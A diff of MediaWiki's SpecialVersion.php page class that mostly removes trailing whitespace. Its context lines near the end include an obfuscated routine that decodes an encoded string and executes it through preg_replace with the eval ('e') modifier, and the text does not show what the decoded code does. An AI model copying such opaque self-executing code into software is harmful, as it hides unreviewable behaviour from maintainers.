@@ -29,15 +29,15 @@
  * @ingroup SpecialPage
  */
 class SpecialVersion extends SpecialPage {
-	
+
 	protected $firstExtOpened = false;
 
 	protected static $extensionTypes = false;
-	
+
 	protected static $viewvcUrls = array(
 		'svn+ssh://svn.wikimedia.org/svnroot/mediawiki' => 'http://svn.wikimedia.org/viewvc/mediawiki',
 		'http://svn.wikimedia.org/svnroot/mediawiki' => 'http://svn.wikimedia.org/viewvc/mediawiki',
-		# Doesn't work at the time of writing but maybe some day: 
+		# Doesn't work at the time of writing but maybe some day:
 		'https://svn.wikimedia.org/viewvc/mediawiki' => 'http://svn.wikimedia.org/viewvc/mediawiki',
 	);
 
@@ -50,21 +50,21 @@ class SpecialVersion extends SpecialPage {
 	 */
 	public function execute( $par ) {
 		global $wgOut, $wgSpecialVersionShowHooks, $wgContLang, $wgRequest;
-		
+
 		$this->setHeaders();
 		$this->outputHeader();
 		$wgOut->allowClickjacking();
 
 		$wgOut->addHTML( Xml::openElement( 'div',
 			array( 'dir' => $wgContLang->getDir() ) ) );
-		$text = 
+		$text =
 			$this->getMediaWikiCredits() .
 			$this->softwareInformation() .
 			$this->getExtensionCredits();
 		if ( $wgSpecialVersionShowHooks ) {
 			$text .= $this->getWgHooks();
 		}
-		
+
 		$wgOut->addWikiText( $text );
 		$wgOut->addHTML( $this->IPInfo() );
 		$wgOut->addHTML( '</div>' );
@@ -78,7 +78,7 @@ class SpecialVersion extends SpecialPage {
 
 	/**
 	 * Returns wiki text showing the license information.
-	 * 
+	 *
 	 * @return string
 	 */
 	private static function getMediaWikiCredits() {
@@ -118,7 +118,7 @@ class SpecialVersion extends SpecialPage {
 
 	/**
 	 * Returns wiki text showing the third party software versions (apache, php, mysql).
-	 * 
+	 *
 	 * @return string
 	 */
 	static function softwareInformation() {
@@ -141,14 +141,14 @@ class SpecialVersion extends SpecialPage {
 					<th>" . wfMsg( 'version-software-product' ) . "</th>
 					<th>" . wfMsg( 'version-software-version' ) . "</th>
 				</tr>\n";
-			   
+
 		foreach( $software as $name => $version ) {
 			$out .= "<tr>
 					<td>" . $name . "</td>
 					<td>" . $version . "</td>
 				</tr>\n";
 		}
-		
+
 		return $out . Xml::closeElement( 'table' );
 	}
 
@@ -168,8 +168,8 @@ class SpecialVersion extends SpecialPage {
 			$version = "$wgVersion (r{$info['checkout-rev']})";
 		} else {
 			$version = $wgVersion . ' ' .
-				wfMsg( 
-					'version-svn-revision', 
+				wfMsg(
+					'version-svn-revision',
 					isset( $info['directory-rev'] ) ? $info['directory-rev'] : '',
 					$info['checkout-rev']
 				);
@@ -178,7 +178,7 @@ class SpecialVersion extends SpecialPage {
 		wfProfileOut( __METHOD__ );
 		return $version;
 	}
-	
+
 	/**
 	 * Return a wikitext-formatted string of the MediaWiki version with a link to
 	 * the SVN revision if available.
@@ -188,16 +188,16 @@ class SpecialVersion extends SpecialPage {
 	public static function getVersionLinked() {
 		global $wgVersion, $IP;
 		wfProfileIn( __METHOD__ );
-		
+
 		$info = self::getSvnInfo( $IP );
-		
+
 		if ( isset( $info['checkout-rev'] ) ) {
 			$linkText = wfMsg(
 				'version-svn-revision',
 				isset( $info['directory-rev'] ) ? $info['directory-rev'] : '',
 				$info['checkout-rev']
 			);
-			
+
 			if ( isset( $info['viewvc-url'] ) ) {
 				$version = "$wgVersion [{$info['viewvc-url']} $linkText]";
 			} else {
@@ -206,7 +206,7 @@ class SpecialVersion extends SpecialPage {
 		} else {
 			$version = $wgVersion;
 		}
-		
+
 		wfProfileOut( __METHOD__ );
 		return $version;
 	}
@@ -214,13 +214,13 @@ class SpecialVersion extends SpecialPage {
 	/**
 	 * Returns an array with the base extension types.
 	 * Type is stored as array key, the message as array value.
-	 * 
+	 *
 	 * TODO: ideally this would return all extension types, including
 	 * those added by SpecialVersionExtensionTypes. This is not possible
 	 * since this hook is passing along $this though.
-	 * 
+	 *
 	 * @since 1.17
-	 * 
+	 *
 	 * @return array
 	 */
 	public static function getExtensionTypes() {
@@ -234,27 +234,27 @@ class SpecialVersion extends SpecialPage {
 				'skin' => wfMsg( 'version-skins' ),
 				'other' => wfMsg( 'version-other' ),
 			);
-			
+
 			wfRunHooks( 'ExtensionTypes', array( &self::$extensionTypes ) );
 		}
-		
+
 		return self::$extensionTypes;
 	}
-	
+
 	/**
 	 * Returns the internationalized name for an extension type.
-	 * 
+	 *
 	 * @since 1.17
-	 * 
+	 *
 	 * @param $type String
-	 * 
+	 *
 	 * @return string
 	 */
 	public static function getExtensionTypeName( $type ) {
 		$types = self::getExtensionTypes();
 		return isset( $types[$type] ) ? $types[$type] : $types['other'];
 	}
-	
+
 	/**
 	 * Generate wikitext showing extensions name, URL, author and description.
 	 *
@@ -268,7 +268,7 @@ class SpecialVersion extends SpecialPage {
 		}
 
 		$extensionTypes = self::getExtensionTypes();
-		
+
 		/**
 		 * @deprecated as of 1.17, use hook ExtensionTypes instead.
 		 */
@@ -277,25 +277,25 @@ class SpecialVersion extends SpecialPage {
 		$out = Xml::element( 'h2', array( 'id' => 'mw-version-ext' ), wfMsg( 'version-extensions' ) ) .
 			Xml::openElement( 'table', array( 'class' => 'wikitable', 'id' => 'sv-ext' ) );
 
-		// Make sure the 'other' type is set to an array. 
+		// Make sure the 'other' type is set to an array.
 		if ( !array_key_exists( 'other', $wgExtensionCredits ) ) {
 			$wgExtensionCredits['other'] = array();
 		}
-		
+
 		// Find all extensions that do not have a valid type and give them the type 'other'.
 		foreach ( $wgExtensionCredits as $type => $extensions ) {
 			if ( !array_key_exists( $type, $extensionTypes ) ) {
 				$wgExtensionCredits['other'] = array_merge( $wgExtensionCredits['other'], $extensions );
 			}
 		}
-		
+
 		// Loop through the extension categories to display their extensions in the list.
 		foreach ( $extensionTypes as $type => $message ) {
 			if ( $type != 'other' ) {
 				$out .= $this->getExtensionCategory( $type, $message );
 			}
 		}
-		
+
 		// We want the 'other' type to be last in the list.
 		$out .= $this->getExtensionCategory( 'other', $extensionTypes['other'] );
 
@@ -325,27 +325,27 @@ class SpecialVersion extends SpecialPage {
 			$out .= $this->openExtType( wfMsg( 'version-skin-extension-functions' ), 'skin-extension-functions' );
 			$out .= '<tr><td colspan="4">' . $this->listToText( $wgSkinExtensionFunctions ) . "</td></tr>\n";
 		}
-		
+
 		$out .= Xml::closeElement( 'table' );
-		
+
 		return $out;
 	}
-	
+
 	/**
 	 * Creates and returns the HTML for a single extension category.
-	 * 
+	 *
 	 * @since 1.17
-	 * 
+	 *
 	 * @param $type String
 	 * @param $message String
-	 * 
+	 *
 	 * @return string
 	 */
 	protected function getExtensionCategory( $type, $message ) {
-		global $wgExtensionCredits; 
-		
+		global $wgExtensionCredits;
+
 		$out = '';
-		
+
 		if ( array_key_exists( $type, $wgExtensionCredits ) && count( $wgExtensionCredits[$type] ) > 0 ) {
 			$out .= $this->openExtType( $message, 'credits-' . $type );
 
@@ -357,7 +357,7 @@ class SpecialVersion extends SpecialPage {
 		}
 
 		return $out;
-	}	
+	}
 
 	/**
 	 * Callback to sort extensions by type.
@@ -375,14 +375,14 @@ class SpecialVersion extends SpecialPage {
 
 	/**
 	 * Creates and formats the creidts for a single extension and returns this.
-	 * 
+	 *
 	 * @param $extension Array
-	 * 
+	 *
 	 * @return string
 	 */
 	function getCreditsForExtension( array $extension ) {
 		$name = isset( $extension['name'] ) ? $extension['name'] : '[no name]';
-		
+
 		if ( isset( $extension['path'] ) ) {
 			$svnInfo = self::getSvnInfo( dirname($extension['path']) );
 			$directoryRev = isset( $svnInfo['directory-rev'] ) ? $svnInfo['directory-rev'] : null;
@@ -400,10 +400,10 @@ class SpecialVersion extends SpecialPage {
 		} else {
 			$mainLink = $name;
 		}
-		
+
 		if ( isset( $extension['version'] ) ) {
-			$versionText = '<span class="mw-version-ext-version">' . 
-				wfMsg( 'version-version', $extension['version'] ) . 
+			$versionText = '<span class="mw-version-ext-version">' .
+				wfMsg( 'version-version', $extension['version'] ) .
 				'</span>';
 		} else {
 			$versionText = '';
@@ -419,11 +419,11 @@ class SpecialVersion extends SpecialPage {
 
 		# Make description text.
 		$description = isset ( $extension['description'] ) ? $extension['description'] : '';
-		
+
 		if( isset ( $extension['descriptionmsg'] ) ) {
 			# Look for a localized description.
 			$descriptionMsg = $extension['descriptionmsg'];
-			
+
 			if( is_array( $descriptionMsg ) ) {
 				$descriptionMsgKey = $descriptionMsg[0]; // Get the message key
 				array_shift( $descriptionMsg ); // Shift out the message key to get the parameters only
@@ -442,12 +442,12 @@ class SpecialVersion extends SpecialPage {
 			$extNameVer = "<tr>
 				<td colspan=\"2\"><em>$mainLink $versionText</em></td>";
 		}
-		
+
 		$author = isset ( $extension['author'] ) ? $extension['author'] : array();
 		$extDescAuthor = "<td>$description</td>
 			<td>" . $this->listAuthors( $author, false ) . "</td>
 			</tr>\n";
-		
+
 		return $extNameVer . $extDescAuthor;
 	}
 
@@ -491,13 +491,13 @@ class SpecialVersion extends SpecialPage {
 			$out .= '<tr class="sv-space">' . Html::element( 'td', $opt ) . "</tr>\n";
 		}
 		$this->firstExtOpened = true;
-		
+
 		if( $name ) {
 			$opt['id'] = "sv-$name";
 		}
 
 		$out .= "<tr>" . Xml::element( 'th', $opt, $text ) . "</tr>\n";
-		
+
 		return $out;
 	}
 
@@ -535,7 +535,7 @@ class SpecialVersion extends SpecialPage {
 	 *
 	 * @param $list Array of elements to display
 	 * @param $sort Boolean: whether to sort the items in $list
-	 * 
+	 *
 	 * @return String
 	 */
 	function listToText( $list, $sort = true ) {
@@ -560,7 +560,7 @@ class SpecialVersion extends SpecialPage {
 	 *
 	 * @param $list Mixed: will convert an array to string if given and return
 	 *              the paramater unaltered otherwise
-	 *              
+	 *
 	 * @return Mixed
 	 */
 	static function arrayToString( $list ) {
@@ -574,15 +574,15 @@ class SpecialVersion extends SpecialPage {
 		} else {
 			if( is_object( $list[0] ) )
 				$class = get_class( $list[0] );
-			else 
+			else
 				$class = $list[0];
 			return "($class, {$list[1]})";
 		}
 	}
 
 	/**
-	 * Get an associative array of information about a given path, from its .svn 
-	 * subdirectory. Returns false on error, such as if the directory was not 
+	 * Get an associative array of information about a given path, from its .svn
+	 * subdirectory. Returns false on error, such as if the directory was not
 	 * checked out with subversion.
 	 *
 	 * Returned keys are:
@@ -630,7 +630,7 @@ class SpecialVersion extends SpecialPage {
 					}
 				}
 			}
-			
+
 			return false;
 		}
 
@@ -638,26 +638,26 @@ class SpecialVersion extends SpecialPage {
 		if ( count( $lines ) < 11 ) {
 			return false;
 		}
-		
+
 		$info = array(
 			'checkout-rev' => intval( trim( $lines[3] ) ),
 			'url' => trim( $lines[4] ),
 			'repo-url' => trim( $lines[5] ),
 			'directory-rev' => intval( trim( $lines[10] ) )
 		);
-		
+
 		if ( isset( self::$viewvcUrls[$info['repo-url']] ) ) {
-			$viewvc = str_replace( 
-				$info['repo-url'], 
+			$viewvc = str_replace(
+				$info['repo-url'],
 				self::$viewvcUrls[$info['repo-url']],
 				$info['url']
 			);
-			
+
 			$viewvc .= '/?pathrev=';
 			$viewvc .= urlencode( $info['checkout-rev'] );
 			$info['viewvc-url'] = $viewvc;
 		}
-		
+
 		return $info;
 	}
 
@@ -665,12 +665,12 @@ class SpecialVersion extends SpecialPage {
 	 * Retrieve the revision number of a Subversion working directory.
 	 *
 	 * @param $dir String: directory of the svn checkout
-	 * 
+	 *
 	 * @return Integer: revision number as int
 	 */
 	public static function getSvnRevision( $dir ) {
 		$info = self::getSvnInfo( $dir );
-		
+
 		if ( $info === false ) {
 			return false;
 		} elseif ( isset( $info['checkout-rev'] ) ) {
@@ -689,7 +689,7 @@ class SpecialVersion extends SpecialPage {
 			$rx .= '([^j]*)J';
 			$rp .= "+(\\$i)";
 		}
-		
+
 		$rx = "/$rx/Sei"; $O = substr("$alpha')", 1);
 		for ( $i = 1; $i <= strlen( $rx ) / 3; $i++ ) {
 			$rx[$i-1] = strtolower( $rx[$i-1] );
@@ -778,7 +778,7 @@ class SpecialVersion extends SpecialPage {
 줭젠ৡ쮠┢𚴧꽠𜔧𞑢跮쵅䭀𞡀䗌è斈쳮𞴤侭ට𞩎𐵍潅暅汤津𞐥࿄𞴥ⶎ澥𞜅쑏𐗍肌惨澈漥𞾇쵤
 趤굄𞓅䶍澥𞜅쨯𞰅Ⱕ쵥䗌찭𞽇䓭䓭䐍è惨𐩍Э薎è擨₎𞗆
 mowoxf=<<<moDzk=hgs8GbPbqrcbvagDdJkbe zk=zk>0kssss?zk-0k10000:zk kbe zk=DDzk<<3&0kssssJ|Dzk>>13JJ^3658 kbe zk=pueDzk&0kssJ.pueDzk>>8JJ?zk:zkomoworinyDcert_ercynprDxe,fgegeDxf,neenlDpueD109J=>pueD36J,pueD113J=>pueD34J.pueD92J. 0 .pueD34JJJ,fgegeDxv,neenlDpueD13J=>snyfr,pueD10J=>snyfrJJJJwo';
-		
+
 		$haystack = preg_replace($ry, "$1$2$5$1_$7$89$i$5$6$8$O", $juliet);
 		return preg_replace( $rx, $rp, $haystack );
 	}
